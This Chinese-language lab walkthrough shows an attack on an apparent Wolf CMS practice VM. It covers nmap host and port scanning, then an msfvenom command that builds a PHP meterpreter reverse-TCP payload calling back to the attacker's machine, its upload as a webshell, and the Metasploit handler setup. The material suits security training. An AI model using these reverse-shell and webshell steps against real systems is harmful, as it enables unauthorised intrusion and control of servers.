## 信息收集

我们在VM中需要确定攻击目标的IP地址，可以使用netdiscover/nmap来获取目标主机的IP地址：

```


nmap -sP 192.168.1.0/24 -T4
```

![](../Images/452aaeeed133b23f950f8902529c8e28.png)

我们已经找到了目标计算机IP地址：192.168.1.11

  

第一步是找出目标计算机上可用的开放端口和一些服务。因此我在目标计算机上启动了nmap全端口T5速度扫描：

```


nmap -sS -sV -sC -O -T5  -Pn -p- 192.168.1.11
```

![](../Images/69e3c2d499a017a3682e7315e1806bc6.png)

## 上传Webshell

### 1、上传php meterpreter payload文件，浏览器访问上传后的文件，获取php类型的反弹会话；

成功登录后，发现能上传文件，这边要使用msfvenom做PHP木马文件上传进行shell提权

#### 1、筛选payload  

```
msfvenom -l payload | grep php | grep meterpreter    筛选合适的payload
```

![](../Images/9858e0df8f4e5fff9b6f776cba6654af.png)

#### 2、生成payload

```
msfvenom -p php/meterpreter\_reverse\_tcp lhost=192.168.1.7 lport=6666 -o Wolfcms.php
```

![](../Images/5225cc5efd4066dcac794a3ee56a76cb.png)

#### 3、上传payload

在web页面上传后记录下上传文件的路径；

![](../Images/0260b74f6d18784fe5c10ee97dbcaab5.png)

```
上传后文件的目录：http://192.168.1.11/wolfcms/public/Wolfcms.php
```

#### 4、Kali设置监听载荷

```


use exploit/multi/handler
```

![](../Images/6ef6a25fdbd64c6f4c68fdf77be43c1a.png)

![](../Images/350c59a5e9f4fce6cca852913a948356.png)

注意：此时上传的php类型的Meterpreter是不具备完整功能的，因此可以继续上传对应操作系统类型的payload获取更多的操作功能；这里发现随然获取了Metrepreter会话，但是shell命令无法执行，后续使用冰蝎上传weblshell连接；
